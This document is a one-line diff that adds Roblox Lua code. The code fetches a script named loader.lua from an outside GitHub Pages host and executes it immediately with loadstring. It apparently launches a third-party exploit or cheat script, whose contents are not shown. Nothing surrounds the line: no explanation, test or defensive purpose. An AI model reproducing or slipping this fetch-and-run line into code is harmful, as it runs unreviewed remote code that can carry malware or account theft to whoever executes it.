@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://xyzzr.github.io/roblox/rice/loader.lua"))()
